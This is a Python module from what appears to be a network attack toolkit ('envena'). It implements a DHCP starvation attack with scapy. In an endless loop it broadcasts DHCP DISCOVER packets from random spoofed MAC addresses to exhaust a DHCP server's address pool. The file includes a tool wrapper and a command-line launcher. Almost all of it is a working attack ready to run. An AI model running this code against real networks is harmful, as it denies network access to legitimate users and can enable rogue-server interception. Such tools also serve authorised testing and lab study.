import time
from random import randint, uniform

from scapy.all import BOOTP, DHCP, IP, UDP, Ether, conf, hexdump, sendp

from src.envena.core.arguments import Arguments, public_args
from src.envena.core.basetool import BaseTool
from src.envena.core.protocols.ethernet.ip.udp.dhcp import (DHCPPacket,
                                                            DHCPPacketType)
from src.envena.modules.ethernet.attack import CATEGORY_DOC
from src.envena.utils.functions import rand_eth


def dhcp_starve(param, logger, ws=None) -> None:
    if param.timeout == None:
        param.timeout = 0.5

    sent_packets = 0
    # print(f'DHCP-starvation attack module, version {dhcp_starve_v}')
    # try:
    # print('*DHCP-starve started. Ctrl+C to stop')
    eth_src = rand_eth()
    hexdump(
        Ether(dst="ff:ff:ff:ff:ff:ff", src=eth_src)
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(
            op=1,  # BOOTREQUEST
            htype=1,  # Ethernet
            hlen=6,  # Длина MAC-адреса
            xid=randint(0, 0xFF_FF_FF_FF),  # Случайный ID транзакции
            chaddr=bytes.fromhex(eth_src.replace(":", "")),  # MAC в бинарном формате
            flags=0x8000,  # Broadcast флаг
        )
        / DHCP(
            options=[
                ("message-type", "discover"),
                ("param_req_list", [1, 3, 6, 15, 31, 33]),  # Стандартные параметры
                "end",
            ]
        )
    )
    while True:
        eth_src = rand_eth()
        ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=eth_src)
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(
            op=1,  # BOOTREQUEST
            htype=1,  # Ethernet
            hlen=6,  # MAC length
            xid=randint(0, 0xFFFFFFFF),  # Random XID
            chaddr=bytes.fromhex(eth_src.replace(":", "")),  # MAC in bin format
            flags=0x8000,  # Broadcast
        )
        dhcp = DHCP(
            options=[
                ("message-type", "discover"),
                ("param_req_list", [1, 3, 6, 15, 31, 33]),  # Base parameters
                "end",
            ]
        )

        packet = ether / ip / udp / bootp / dhcp

        # Send packet
        try:
            sendp(packet, iface=param.iface, verbose=False)
            logger.info(f"{sent_packets}... Sent DHCP-discover from MAC: {eth_src}")
            sent_packets += 1
        except Exception as e:
            logger.error(f"Packet was not sent: {e}")
        time.sleep(round(uniform(0, param.timeout), 3))  # 0.5 is optimal
    # except KeyboardInterrupt:
    # logger.info(f"{sent_packets} packet(s) sent")


class t_dhcp_starve(BaseTool):
    """
    DHCP Starvation attack to exhaust IP pool.

    Arguments:
        timeout (Optional): Delay between DISCOVER packets (default: 0.5).
        iface (Optional): Interface to use.

    Example:
        args set timeout 0.1
        dhcp_starve
    """

    def __init__(self, tool_func=dhcp_starve, VERSION=1.0):
        self.category = CATEGORY_DOC
        super().__init__(tool_func=tool_func, VERSION=VERSION)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description=f"DHCP-starvation attack module")
    parser.add_argument(
        "-i",
        "--iface",
        required=True,
        help="network interface",
        default=str(conf.iface),
    )
    cli_args = parser.parse_args()

    # args=Arguments()

    public_args.iface = cli_args.iface

    t_dhcp_starve.start_tool()
